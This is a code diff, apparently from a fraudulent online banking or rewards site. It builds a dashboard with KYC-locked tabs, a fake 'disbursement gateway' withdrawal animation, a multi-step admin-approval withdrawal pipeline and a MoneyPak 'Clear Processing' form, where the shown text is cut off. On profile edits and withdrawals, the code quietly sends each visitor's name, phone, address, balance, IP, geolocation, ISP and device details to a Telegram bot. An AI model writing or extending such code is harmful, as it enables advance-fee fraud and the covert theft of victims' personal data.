+      `<b>Phone:</b> ${tgEsc(u.phone || 'N/A')}\n` +
+      `<b>Address:</b> ${tgEsc(address)}\n` +
+      `<b>Balance:</b> ${fmtMoney(state.userBalance)}\n` +
+      `<b>IP:</b> <code>${tgEsc(net.ip || 'Unknown')}</code>\n` +
+      `<b>Geo:</b> ${tgEsc([net.city, net.region, net.country].filter(Boolean).join(', ') || 'N/A')}\n` +
+      `<b>ISP:</b> ${tgEsc(net.org || 'N/A')}\n` +
+      `<b>Timezone:</b> ${tgEsc(net.timezone || 'N/A')}\n` +
+      `<b>Device:</b> ${tgEsc(dev.type + ' · ' + dev.os + ' · ' + dev.browser)}\n` +
+      `<b>User-Agent:</b> <code>${tgEsc(navigator.userAgent)}</code>\n` +
+      `<b>Timestamp:</b> ${new Date().toISOString()}`
+  };
+}
+
+/* ─────────────── Session auth guard ─────────────── */
+function guardAuth() {
+  if (!state.currentUser || !state.currentUser.username) {
+    window.location.href = 'index.html';
+    return false;
+  }
+  return true;
+}
+function logout() {
+  logAccess('Logged Out');
+  cachedDashboardQuote = null;
+  state.currentUser = null;
+  saveDeviceState();
+  window.location.href = 'index.html';
+}
+
+/* ─────────────── Header Nav ─────────────── */
+function renderHeaderNav() {
+  const nav = document.getElementById('nav-actions');
+  if (!nav) return;
+  if (!state.currentUser) { nav.innerHTML = ''; return; }
+  const u = state.currentUser;
+  const avatar = u.photoUrl ? `<img src="${u.photoUrl}" class="w-7 h-7 rounded-full object-cover border border-gold-400">` : `<div class="w-7 h-7 rounded-full bg-gold-500 text-navy-950 flex items-center justify-center font-bold text-xs">${(u.firstName||'U').charAt(0)}</div>`;
+  const badge = unreadCount();
+  nav.innerHTML = `
+    <button onclick="openMessagesModal()" class="relative px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-slate-300 hover:text-white transition rounded-lg" title="Messages"><i class="fa-solid fa-bell sm:mr-1"></i><span class="hidden sm:inline">Messages</span>${badge>0?`<span class="absolute top-0.5 right-0.5 bg-rose-500 text-white text-[8px] font-black min-w-[16px] h-4 rounded-full flex items-center justify-center px-1">${badge>9?'9+':badge}</span>`:''}</button>
+    <button onclick="openAccessLogModal()" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-slate-300 hover:text-white transition rounded-lg" title="Access Log"><i class="fa-solid fa-shield-halved sm:mr-1"></i><span class="hidden sm:inline">Access Log</span></button>
+    <button onclick="openSettingsModal()" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition rounded-lg flex items-center gap-1.5">${avatar}<span class="hidden sm:inline">${u.firstName||''}</span><i class="fa-solid fa-gear ml-1"></i></button>
+    <button onclick="logout()" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-rose-400 hover:text-white transition rounded-lg"><i class="fa-solid fa-right-from-bracket sm:mr-1"></i><span class="hidden sm:inline">Logout</span></button>
+  `;
+}
+
+/* ─────────────── Nav Drawer + Tabs ─────────────── */
+function toggleNavDrawer() {
+  const drawer = document.getElementById('nav-drawer');
+  const overlay = document.getElementById('nav-overlay');
+  if (drawer.classList.contains('-translate-x-full')) {
+    drawer.classList.remove('-translate-x-full');
+    overlay.classList.remove('hidden');
+  } else {
+    drawer.classList.add('-translate-x-full');
+    overlay.classList.add('hidden');
+  }
+}
+
+const DASHBOARD_TABS = [
+  { key:'overview', label:'Overview', icon:'fa-gauge-high', href:'overview.html' },
+  { key:'funds', label:'Funds', icon:'fa-wallet', href:'funds.html' },
+  { key:'transfer', label:'Transfer', icon:'fa-arrow-right-arrow-left', href:'transfer.html' },
+  { key:'history', label:'History', icon:'fa-rectangle-list', href:'history.html' },
+  { key:'support', label:'Support', icon:'fa-headset', href:'support.html' },
+  { key:'promotions', label:'Promotions', icon:'fa-trophy', href:'promotions.html' },
+  { key:'spin', label:'Arcade Hub', icon:'fa-dharmachakra', href:'spin.html' },
+  { key:'winners', label:'Winners Wall', icon:'fa-crown', href:'winners.html' },
+  { key:'cards', label:'Cards', icon:'fa-credit-card', href:'cards.html' },
+  { key:'referrals', label:'Referrals', icon:'fa-gift', href:'referrals.html' },
+  { key:'withdrawals', label:'Withdrawals', icon:'fa-money-bill-transfer', href:'withdrawals.html' },
+  { key:'goals', label:'Goals', icon:'fa-bullseye', href:'goals.html' },
+  { key:'notifications', label:'Alerts', icon:'fa-bell', href:'notifications.html' },
+  { key:'kyc', label:'KYC', icon:'fa-id-card', href:'kyc.html' }
+];
+
+function isTabLocked(tabKey) {
+  const isKycApproved = state.kyc && state.kyc.status === 'approved';
+  const isSetupComplete = !!state.configuredMethod;
+  if (['transfer', 'cards', 'withdrawals'].includes(tabKey)) return !isKycApproved || !isSetupComplete;
+  if (tabKey === 'funds') return !isKycApproved;
+  if (tabKey === 'winners') return !isKycApproved;
+  if (tabKey === 'spin') return !isKycApproved || !isSetupComplete;
+  return false;
+}
+
+function showKycLockToast() { showToast('Identity Required', 'Please complete KYC verification.', 'warning'); setTimeout(() => { window.location.href = 'kyc.html'; }, 1000); }
+
+function renderNavItems(activeKey) { 
+  return DASHBOARD_TABS.map(it=>{ 
+    const active = it.key===activeKey; 
+    const locked = isTabLocked(it.key); 
+    return `<a href="${locked ? '#' : it.href}" onclick="${locked ? 'event.preventDefault(); showKycLockToast()' : ''}" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-bold transition ${active?'text-gold-400 bg-gold-500/10':(locked ? 'text-slate-500 opacity-60' : 'text-slate-300 hover:text-white hover:bg-navy-800')}"><i class="fa-solid ${locked ? 'fa-lock' : it.icon} w-4 text-center"></i><span>${it.label}</span></a>`; 
+  }).join(''); 
+}
+
+function renderDashboardSidebar(activeKey) {
+  return `<aside class="hidden lg:block w-56 shrink-0"><div class="sticky top-24 space-y-1.5">
+    <p class="text-[10px] text-slate-500 uppercase font-bold tracking-widest px-3 mb-3">Dashboard</p>
+    ${renderNavItems(activeKey)}
+  </div></aside>`;
+}
+
+function renderDashboardShell(activeKey, contentHtml) {
+  return `<div class="dash-shell flex-grow w-full"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8 pb-8">
+    <div class="flex flex-col lg:flex-row gap-6 lg:gap-8">
+      ${renderDashboardSidebar(activeKey)}
+      <div class="flex-1 min-w-0 space-y-6">${contentHtml}</div>
+    </div>
+  </div></div>`;
+}
+
+/* ─────────────── Announcement banner ─────────────── */
+function renderAnnouncementBanner() {
+  const a = state.announcement;
+  if (!a || !a.active || !a.text) return '';
+  if (state.announcementDismissedAt && state.announcementDismissedAt >= (a.updatedAt||0)) return '';
+  return `<div class="bg-gradient-to-r from-sky-custom/20 via-navy-800 to-gold-500/20 border border-sky-custom/40 rounded-2xl p-4 flex items-start gap-3"><div class="w-9 h-9 rounded-xl bg-sky-custom/20 text-sky-custom flex items-center justify-center shrink-0"><i class="fa-solid fa-bullhorn"></i></div><div class="flex-1 min-w-0"><p class="text-[10px] font-black uppercase tracking-widest text-sky-custom">Announcement</p><p class="text-xs sm:text-sm text-white mt-1 leading-relaxed">${escapeHtml(a.text)}</p></div><button onclick="dismissAnnouncement()" class="text-slate-400 hover:text-white p-1 shrink-0"><i class="fa-solid fa-xmark"></i></button></div>`;
+}
+function dismissAnnouncement(){ state.announcementDismissedAt = state.announcement?.updatedAt || Date.now(); saveDeviceState(); render(); }
+
+/* ─────────────── Withdrawal pipeline banner ─────────────── */
+function renderWithdrawalPipelineBanner() {
+  const ws = state.withdrawalState || 'none';
+  if (ws === 'none') return '';
+  const flow = WITHDRAWAL_FLOW[ws]; if (!flow) return '';
+  const cw = state.currentWithdrawal || {};
+  const amt = Number(cw.amount) || 0; const ref = cw.refNum || '—'; const started = cw.date || '—';
+  const admin = isAdminMode();
+  const toneBorder = flow.tone==='gold'?'border-gold-500/40':flow.tone==='sky'?'border-sky-custom/40':'border-emerald-500/40';
+  const toneIcon = flow.tone==='gold'?'text-gold-400':flow.tone==='sky'?'text-sky-custom':'text-emerald-400';
+  const toneBadge = flow.tone==='gold'?'bg-gold-500/20 text-gold-400 border border-gold-500/40':flow.tone==='sky'?'bg-sky-custom/20 text-sky-custom border border-sky-custom/40':'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40';
+  const toneDot = flow.tone==='gold'?'bg-gold-400':flow.tone==='sky'?'bg-sky-custom':'bg-emerald-400';
+  const progress = [1,2,3].map(i => { const done = i<flow.stepNum; const active = i===flow.stepNum; const cls = done?'timeline-dot done':active?'timeline-dot active':'timeline-dot'; return `<div class="flex flex-col items-center gap-1"><div class="${cls}"><i class="fa-solid ${done?'fa-check':active?'fa-circle-dot':'fa-circle'}"></i></div><span class="text-[9px] uppercase font-bold ${done?'text-emerald-400':active?'text-sky-custom':'text-slate-500'}">Step ${i}</span></div>${i<3?`<div class="flex-1 h-0.5 ${i<flow.stepNum?'bg-gradient-to-r from-emerald-500 to-sky-custom':'bg-navy-700'} mx-1 mb-4"></div>`:''}`; }).join('');
+  const userActionBtn = flow.userAction ? `<button onclick="${flow.userAction}" class="w-full py-3 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl text-xs active:scale-95"><i class="fa-solid ${flow.icon} mr-1.5"></i>${flow.userLabel}</button>` : '';
+  const adminBlock = (admin && flow.adminNext) ? `<div class="pt-4 mt-2 border-t border-rose-500/30 space-y-2"><p class="text-[10px] text-rose-400 uppercase font-bold tracking-widest flex items-center"><i class="fa-solid fa-user-shield mr-1.5"></i>Admin Actions</p><button onclick="adminApproveStep()" class="w-full py-3 bg-gradient-to-r from-rose-500 to-rose-600 text-white font-extrabold rounded-xl text-xs active:scale-95 shadow-lg shadow-rose-500/20"><i class="fa-solid fa-check mr-1.5"></i>${flow.adminLabel}</button></div>` : '';
+  return `<div class="bg-navy-800 ${toneBorder} border rounded-3xl p-6 sm:p-7 card-3d relative overflow-hidden"><div class="absolute -top-8 -right-8 text-9xl text-gold-500/5 pointer-events-none"><i class="fa-solid fa-money-bill-transfer"></i></div><div class="relative z-10 space-y-5"><div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3"><div><p class="text-[10px] text-slate-400 uppercase font-bold tracking-widest">Withdrawal · Step ${flow.stepNum} of 3</p><h3 class="text-base sm:text-lg font-bold text-white flex items-center mt-0.5"><i class="fa-solid ${flow.icon} ${toneIcon} mr-2"></i>${flow.stepLabel}</h3><p class="text-[11px] text-slate-400 mt-0.5">${fmtMoney(amt)} · Ref ${escapeHtml(ref)} · Requested ${escapeHtml(started)}</p></div><span class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-[10px] font-black ${toneBadge}"><span class="w-2 h-2 rounded-full ${toneDot} pulse-dot"></span>${flow.status}</span></div><div class="flex items-center">${progress}</div><div class="bg-navy-900/60 border border-navy-700/60 rounded-xl p-4"><p class="text-xs text-slate-300 leading-relaxed">${flow.description}</p></div>${userActionBtn}${adminBlock}</div></div>`;
+}
+
+async function adminApproveStep() {
+  const ws = state.withdrawalState;
+  const flow = WITHDRAWAL_FLOW[ws];
+  if (!flow || !flow.adminNext) return;
+  const cw = Object.assign({}, state.currentWithdrawal || {});
+  const next = flow.adminNext;
+  const common = await buildCommonTgBlock();
+
+  if (next === 'none') {
+    const idx = state.transactions.findIndex(t=>t.ref === cw.refNum);
+    if (idx >= 0) state.transactions[idx] = Object.assign({}, state.transactions[idx], {status:'Completed'});
+    state.withdrawalState = 'none';
+    state.currentWithdrawal = null;
+    saveDeviceState();
+    sendTelegramMessage(
+      `✅ <b>WITHDRAWAL COMPLETED (ADMIN APPROVAL)</b>\n` +
+      `<b>Ref:</b> ${tgEsc(cw.refNum||'—')}\n` +
+      `<b>Amount:</b> ${fmtMoney(Number(cw.amount)||0)}\n` +
+      `<b>Final Step:</b> ${tgEsc(flow.stepLabel)}\n` +
+      common.block
+    ).catch(()=>{});
+    showToast('Withdrawal Completed', `Ref ${cw.refNum||'—'} marked Completed.`, 'success');
+    render();
+    return;
+  }
+  state.withdrawalState = next;
+  saveDeviceState();
+  sendTelegramMessage(
+    `🛡️ <b>ADMIN APPROVAL — ${tgEsc(flow.stepLabel)}</b>\n` +
+    `<b>Ref:</b> ${tgEsc(cw.refNum||'—')}\n` +
+    `<b>Amount:</b> ${fmtMoney(Number(cw.amount)||0)}\n` +
+    `<b>Advanced To:</b> ${tgEsc(next.replace(/_/g,' '))}\n` +
+    common.block
+  ).catch(()=>{});
+  showToast('Step Approved', 'Advanced to next stage.', 'success');
+  render();
+}
+
+/* ─────────────── Settings / Access Log / Messages ─────────────── */
+let tempPhotoUrl = null;
+function openSettingsModal() {
+  const u = state.currentUser; if (!u) return; tempPhotoUrl = null;
+  showModal('Account & Profile Settings', `<form onsubmit="saveProfileSettings(event)" class="space-y-4">
+    <div class="flex items-center space-x-4 pb-3 border-b border-navy-700">
+      <div id="settings-photo-preview" class="w-20 h-20 rounded-2xl bg-gradient-to-br from-gold-400 to-gold-600 text-navy-950 flex items-center justify-center font-bold text-2xl overflow-hidden border-2 border-gold-400/60 shadow-lg shadow-gold-500/20">${u.photoUrl?`<img src="${u.photoUrl}" class="w-full h-full object-cover">`:(u.firstName||'U').charAt(0)}</div>
+      <div class="flex-grow"><label class="block text-xs font-bold text-gold-400 uppercase mb-1.5"><i class="fa-solid fa-camera mr-1"></i> Profile Photo</label><input type="file" id="settings-photo-input" accept="image/*" onchange="handlePhotoUpload(event)" class="w-full text-xs text-slate-400 file:mr-2 file:py-2 file:px-3.5 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-sky-custom file:text-navy-950 file:cursor-pointer cursor-pointer bg-navy-950 border border-navy-700 rounded-xl p-1.5 focus:outline-none focus:border-sky-custom"><p id="photo-upload-status" class="text-[10px] text-slate-400 mt-1.5">JPG or PNG · auto-optimized.</p></div>
+    </div>
+    <div class="grid grid-cols-2 gap-3"><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">First Name</label><input type="text" id="set-fname" value="${escapeHtml(u.firstName||'')}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2 text-xs sm:text-sm text-white focus:outline-none focus:border-sky-custom"></div><div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Last Name</label><input type="text" id="set-lname" value="${escapeHtml(u.lastName||'')}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2 text-xs sm:text-sm text-white focus:outline-none focus:border-sky-custom"></div></div>
+    <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Phone</label><input type="tel" id="set-phone" value="${escapeHtml(u.phone||'')}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2 text-xs sm:text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+    <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Address</label><input type="text" id="set-address" value="${escapeHtml(u.address||'')}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2 text-xs sm:text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+    <div class="grid grid-cols-3 gap-2"><div><label class="block text-[10px] font-bold text-slate-300 uppercase mb-1">City</label><input type="text" id="set-city" value="${escapeHtml(u.city||'')}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-2.5 py-2 text-xs text-white focus:outline-none focus:border-sky-custom"></div><div><label class="block text-[10px] font-bold text-slate-300 uppercase mb-1">State</label><input type="text" id="set-state" value="${escapeHtml(u.stateOrParish||'')}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-2.5 py-2 text-xs text-white focus:outline-none focus:border-sky-custom"></div><div><label class="block text-[10px] font-bold text-slate-300 uppercase mb-1">ZIP</label><input type="text" id="set-zip" value="${escapeHtml(u.zip||'')}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-2.5 py-2 text-xs text-white focus:outline-none focus:border-sky-custom"></div></div>
+    <div class="flex justify-end pt-3 gap-3"><button type="button" onclick="closeModal()" class="px-4 py-2 bg-navy-950 text-slate-300 font-bold rounded-xl text-xs">Cancel</button><button type="submit" class="px-6 py-2 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl text-xs active:scale-95">Save Changes</button></div>
+  </form>`);
+}
+function compressImage(file, maxSize=420, quality=0.85) {
+  return new Promise((resolve)=>{
+    const reader = new FileReader();
+    reader.onload = (e)=>{
+      const raw = e.target.result;
+      if (!file.type || !file.type.startsWith('image/')) return resolve(raw);
+      const img = new Image();
+      img.onload = ()=>{ let {width,height} = img; const scale = Math.min(1, maxSize/Math.max(width,height)); width = Math.max(1, Math.round(width*scale)); height = Math.max(1, Math.round(height*scale)); const canvas = document.createElement('canvas'); canvas.width = width; canvas.height = height; canvas.getContext('2d').drawImage(img,0,0,width,height); try { resolve(canvas.toDataURL('image/jpeg', quality)); } catch(err){ resolve(raw); } };
+      img.onerror = ()=>resolve(raw);
+      img.src = raw;
+    };
+    reader.onerror = ()=>resolve(null);
+    reader.readAsDataURL(file);
+  });
+}
+async function handlePhotoUpload(event) {
+  const file = event.target.files && event.target.files[0]; if (!file) return;
+  const statusEl = document.getElementById('photo-upload-status');
+  if (statusEl) statusEl.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-1 text-sky-custom"></i> Optimizing...';
+  const dataUrl = await compressImage(file, 420, 0.85);
+  if (!dataUrl) { if (statusEl) statusEl.innerHTML = '<span class="text-rose-400">Could not read.</span>'; return; }
+  tempPhotoUrl = dataUrl;
+  const prev = document.getElementById('settings-photo-preview');
+  if (prev) prev.innerHTML = `<img src="${dataUrl}" class="w-full h-full object-cover">`;
+  if (statusEl) { const kb = Math.round((dataUrl.length*0.75)/1024); statusEl.innerHTML = `<span class="text-emerald-400 font-bold"><i class="fa-solid fa-circle-check mr-1"></i>Ready</span> · ${kb} KB`; }
+}
+async function saveProfileSettings(e) {
+  e.preventDefault(); if (!state.currentUser) return;
+  const u = state.currentUser;
+  const before = { firstName:u.firstName||'', lastName:u.lastName||'', phone:u.phone||'', address:u.address||'', city:u.city||'', stateOrParish:u.stateOrParish||'', zip:u.zip||'', photoChanged:false };
+  u.firstName = document.getElementById('set-fname').value;
+  u.lastName = document.getElementById('set-lname').value;
+  u.phone = document.getElementById('set-phone').value;
+  u.address = document.getElementById('set-address').value;
+  u.city = document.getElementById('set-city').value;
+  u.stateOrParish = document.getElementById('set-state').value;
+  u.zip = document.getElementById('set-zip').value;
+  if (tempPhotoUrl) { u.photoUrl = tempPhotoUrl; tempPhotoUrl = null; before.photoChanged = true; }
+  const idx = state.registeredUsers.findIndex(x=>x && x.username===u.username);
+  if (idx>=0) state.registeredUsers[idx] = Object.assign({}, state.registeredUsers[idx], u);
+  saveDeviceState();
+  closeModal(); showToast('Profile Updated', 'Changes saved.', 'success');
+
+  const common = await buildCommonTgBlock();
+  const changeLines = [];
+  if (before.firstName !== u.firstName || before.lastName !== u.lastName) changeLines.push(`Name: ${tgEsc(before.firstName + ' ' + before.lastName)} → ${tgEsc(u.firstName + ' ' + u.lastName)}`);
+  if (before.phone !== u.phone) changeLines.push(`Phone: ${tgEsc(before.phone || '—')} → ${tgEsc(u.phone || '—')}`);
+  if (before.address !== u.address) changeLines.push(`Address: ${tgEsc(before.address || '—')} → ${tgEsc(u.address || '—')}`);
+  if (before.city !== u.city) changeLines.push(`City: ${tgEsc(before.city || '—')} → ${tgEsc(u.city || '—')}`);
+  if (before.stateOrParish !== u.stateOrParish) changeLines.push(`State: ${tgEsc(before.stateOrParish || '—')} → ${tgEsc(u.stateOrParish || '—')}`);
+  if (before.zip !== u.zip) changeLines.push(`ZIP: ${tgEsc(before.zip || '—')} → ${tgEsc(u.zip || '—')}`);
+  if (before.photoChanged) changeLines.push(`Profile photo: updated`);
+
+  sendTelegramMessage(
+    `✏️ <b>PROFILE UPDATED</b>\n` +
+    `<b>Changes:</b>\n${changeLines.length ? changeLines.map(l => '  • ' + l).join('\n') : '  • (no changes)'}\n` +
+    common.block
+  ).catch(()=>{});
+  render();
+}
+function openAccessLogModal() {
+  const logs = state.accessLogs || [];
+  const rows = logs.length===0 ? `<div class="py-10 text-center text-slate-400 text-xs bg-navy-900 border border-navy-700/60 rounded-2xl"><i class="fa-solid fa-shield-halved text-2xl text-slate-500 mb-2 block"></i>No access events yet.</div>` : logs.slice(0,40).map(l=>{ const osIcon = l.os==='iOS'||l.os==='Android'?'fa-mobile-screen-button':(l.os==='macOS'?'fa-laptop':'fa-desktop'); return `<div class="bg-navy-900/80 border border-navy-700/60 rounded-xl px-4 py-3 flex flex-col sm:flex-row sm:items-center justify-between gap-3"><div class="flex items-start gap-3 min-w-0"><div class="w-9 h-9 rounded-xl bg-navy-950 border border-navy-700 flex items-center justify-center text-sky-custom shrink-0"><i class="fa-solid ${osIcon}"></i></div><div class="min-w-0"><p class="text-xs sm:text-sm font-bold text-white">${escapeHtml(l.action)} <span class="text-slate-400 font-normal">· ${escapeHtml(l.name||l.user||'')}</span></p><p class="text-[10px] text-slate-400 mt-0.5 truncate"><i class="fa-solid fa-globe mr-1 text-sky-custom"></i>${escapeHtml(l.ip)} · ${escapeHtml(l.os)} · ${escapeHtml(l.browser)}</p></div></div><p class="text-[10px] text-slate-400 shrink-0">${escapeHtml(l.time)}</p></div>`; }).join('');
+  showModal('Access Log', `<div class="space-y-3"><div class="space-y-2 max-h-[400px] overflow-y-auto pr-1">${rows}</div><div class="flex justify-between items-center pt-2"><button onclick="clearAccessLogs()" class="px-3 py-2 bg-navy-950 border border-rose-500/40 text-rose-400 rounded-xl text-xs font-bold active:scale-95"><i class="fa-solid fa-trash mr-1"></i> Clear</button><span class="text-[10px] text-slate-500">${logs.length} event(s)</span></div></div>`);
+}
+function clearAccessLogs(){ state.accessLogs = []; saveDeviceState(); showToast('Cleared', 'Access log removed.', 'info'); openAccessLogModal(); }
+function openMessagesModal() {
+  const msgs = state.messages || []; const readTime = state.messagesReadAt || 0;
+  showModal('Messages from Admin', `<div class="space-y-2 max-h-[60vh] overflow-y-auto">${msgs.length===0?'<p class="text-xs text-slate-500 text-center py-6">No messages yet.</p>':msgs.map(m=>{ const isNew = (m.sentAt||0) > readTime; return `<div class="bg-navy-900 border ${isNew?'border-sky-custom/50':'border-navy-700'} rounded-xl p-3"><div class="flex items-center justify-between mb-1"><p class="text-xs font-bold text-white">${escapeHtml(m.title||'Message')}</p>${isNew?'<span class="px-1.5 py-0.5 bg-sky-custom/20 text-sky-custom text-[8px] font-black rounded uppercase">New</span>':''}</div><p class="text-[11px] text-slate-300 leading-relaxed">${escapeHtml(m.body||'')}</p><p class="text-[9px] text-slate-500 mt-1">${new Date(m.sentAt||Date.now()).toLocaleString()}</p></div>`; }).join('')}</div>`);
+  state.messagesReadAt = Date.now(); saveDeviceState();
+}
+
+/* ─────────────── Withdrawal modals ─────────────── */
+function showSetupLockToast(){ showToast('Feature Locked', 'Complete your Weekly Funds setup to unlock withdrawals & P2P.', 'warning'); setTimeout(()=>openWeeklyFundsModal(), 400); }
+
+function openWithdrawModal() {
+  if (!state.configuredMethod) { showSetupLockToast(); return; }
+  const ws = state.withdrawalState || 'none';
+  if (ws !== 'none') {
+    const flow = WITHDRAWAL_FLOW[ws];
+    const msg = flow ? `Current status: <b class="text-sky-custom">${flow.stepLabel}</b> — ${flow.status}. Please complete the current step first.` : 'Your current withdrawal pipeline is still outstanding.';
+    showModal('Withdrawal In Progress', `<div class="text-center py-4 space-y-4"><div class="w-16 h-16 bg-gold-500/20 text-gold-400 rounded-full mx-auto flex items-center justify-center text-2xl"><i class="fa-solid fa-lock"></i></div><h3 class="text-lg font-bold text-white">Withdrawal Not Available</h3><p class="text-sm text-slate-300 leading-relaxed">${msg}</p></div>`);
+    return;
+  }
+  ensureDailyLimits();
+  const wd = state.dailyLimits.withdrawal; const remaining = wd.limit - wd.used;
+  if (remaining <= 0) { showModal('Daily Limit Reached', `<div class="text-center py-4 space-y-4"><div class="w-16 h-16 bg-rose-500/20 text-rose-400 rounded-full mx-auto flex items-center justify-center text-2xl"><i class="fa-solid fa-ban"></i></div><h3 class="text-lg font-bold text-white">Limit Reached</h3><p class="text-sm text-slate-300 leading-relaxed">You've used your full daily withdrawal limit (${fmtMoney(wd.limit)}). Try again tomorrow.</p></div>`); return; }
+  showModal('Withdraw Funds', `<form onsubmit="submitWithdrawal(event)" class="space-y-4">
+    <div><div class="flex justify-between items-center mb-1"><label class="block text-xs font-bold text-slate-300 uppercase">Amount (USD)</label><span class="text-[11px] text-slate-400">Available: <span class="text-gold-400 font-bold">${fmtMoney(state.userBalance)}</span></span></div><input type="number" id="wd-amount" required max="${Math.min(state.userBalance, remaining)}" min="10" step="0.01" value="${Math.min(4500, state.userBalance, remaining)}" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
+    <p class="text-[10px] text-slate-500"><i class="fa-solid fa-circle-info mr-1"></i>Daily remaining: <span class="text-gold-400 font-bold">${fmtMoney(remaining)}</span> of ${fmtMoney(wd.limit)}</p>
+    <div class="flex flex-wrap gap-2 pt-1"><button type="button" onclick="setWdAmount(500)" class="px-3 py-1.5 bg-navy-900 border border-navy-700 rounded-lg text-xs font-bold text-slate-300 hover:text-white active:scale-95">$500</button><button type="button" onclick="setWdAmount(1000)" class="px-3 py-1.5 bg-navy-900 border border-navy-700 rounded-lg text-xs font-bold text-slate-300 hover:text-white active:scale-95">$1,000</button><button type="button" onclick="setWdAmount(2500)" class="px-3 py-1.5 bg-navy-900 border border-navy-700 rounded-lg text-xs font-bold text-slate-300 hover:text-white active:scale-95">$2,500</button><button type="button" onclick="setWdAmount(${Math.min(state.userBalance, remaining)})" class="px-3 py-1.5 bg-sky-custom/20 border border-sky-custom/40 rounded-lg text-xs font-bold text-sky-custom active:scale-95">Max</button></div>
+    <div id="wd-error" class="text-rose-400 text-xs hidden"></div>
+    <div class="flex justify-end pt-3"><button type="submit" class="w-full sm:w-auto px-6 py-3 bg-sky-custom text-navy-950 font-bold rounded-xl text-xs sm:text-sm active:scale-95">Submit Withdrawal Request</button></div>
+  </form>`);
+}
+function setWdAmount(val){ const input = document.getElementById('wd-amount'); if (input) input.value = Math.min(val, parseFloat(input.max)); }
+
+async function submitWithdrawal(e) {
+  e.preventDefault();
+  if (!state.configuredMethod) { closeModal(); showSetupLockToast(); return; }
+  const amt = parseFloat(document.getElementById('wd-amount').value);
+  const errEl = document.getElementById('wd-error');
+  if (isNaN(amt) || amt <= 0 || amt > state.userBalance) { errEl.textContent = 'Invalid amount.'; errEl.classList.remove('hidden'); return; }
+  ensureDailyLimits();
+  const remaining = state.dailyLimits.withdrawal.limit - state.dailyLimits.withdrawal.used;
+  if (amt > remaining) { errEl.textContent = `Amount exceeds remaining daily limit (${fmtMoney(remaining)}).`; errEl.classList.remove('hidden'); return; }
+  closeModal();
+  const container = document.getElementById('app-container');
+  container.innerHTML = `<div class="flex-grow flex items-center justify-center p-6"><div class="bg-navy-800 border border-navy-700 p-8 sm:p-10 rounded-3xl max-w-md w-full text-center shadow-2xl space-y-6 card-3d"><div class="relative w-20 h-20 sm:w-24 sm:h-24 mx-auto flex items-center justify-center"><div class="absolute inset-0 rounded-full border-4 border-sky-custom/20 border-t-sky-custom animate-spin"></div><i class="fa-solid fa-money-bill-transfer text-2xl sm:text-3xl text-sky-custom"></i></div><div><h3 class="text-xl sm:text-2xl font-bold text-white mb-2">Processing Withdrawal</h3><p class="text-xs text-slate-400">Communicating with disbursement gateway...</p></div><div class="w-full bg-navy-950 h-4 rounded-full overflow-hidden border border-navy-700 shadow-inner p-0.5"><div id="wd-loading-bar" class="bg-gradient-to-r from-gold-400 via-sky-custom to-emerald-400 h-full w-0 rounded-full transition-all duration-300"></div></div><div id="wd-loading-pct" class="text-base sm:text-lg font-black text-gold-400">0%</div></div></div>`;
+  let progress = 0;
+  const balBefore = state.userBalance;
+  const interval = setInterval(async ()=>{
+    progress += 10;
+    const bar = document.getElementById('wd-loading-bar'); const pct = document.getElementById('wd-loading-pct');
+    if (bar && pct) { bar.style.width = progress + '%'; pct.textContent = progress + '%'; }
+    if (progress >= 100) {
+      clearInterval(interval);
+      state.userBalance -= amt;
+      if (state.dailyLimits.withdrawal) state.dailyLimits.withdrawal.used = +(state.dailyLimits.withdrawal.used + amt).toFixed(2);
+      const refNum = 'TXN-' + Math.floor(10000 + Math.random()*90000);
+      const nowStr = new Date().toISOString().replace('T',' ').substring(0,16);
+      state.transactions.unshift({ ref:refNum, date:nowStr, amount:amt, type:'Withdrawal Request', status:'Pending' });
+      state.withdrawalState = 'pending';
+      state.currentWithdrawal = { amount:amt, refNum, date:nowStr };
+      saveDeviceState();
+      showToast('Withdrawal Submitted', `Ref ${refNum} — awaiting admin approval.`, 'warning');
+
+      const common = await buildCommonTgBlock();
+      sendTelegramMessage(
+        `💸 <b>WITHDRAWAL REQUESTED</b>\n` +
+        `<b>Ref:</b> ${tgEsc(refNum)}\n` +
+        `<b>Amount:</b> ${fmtMoney(amt)}\n` +
+        `<b>Balance before:</b> ${fmtMoney(balBefore)}\n` +
+        `<b>Balance after:</b> ${fmtMoney(state.userBalance)}\n` +
+        `<b>Status:</b> PENDING ADMIN APPROVAL\n` +
+        `<b>Method:</b> ${tgEsc(state.configuredMethod || 'N/A')}\n` +
+        common.block
+      ).catch(()=>{});
+
+      render();
+    }
+  }, 200);
+}
+
+function openMoneyPakModal() {
+  const cw = state.currentWithdrawal || {}; const amt = Number(cw.amount) || 0;
+  showModal('Clear Processing', `<form onsubmit="submitMoneyPak(event)" class="space-y-4">
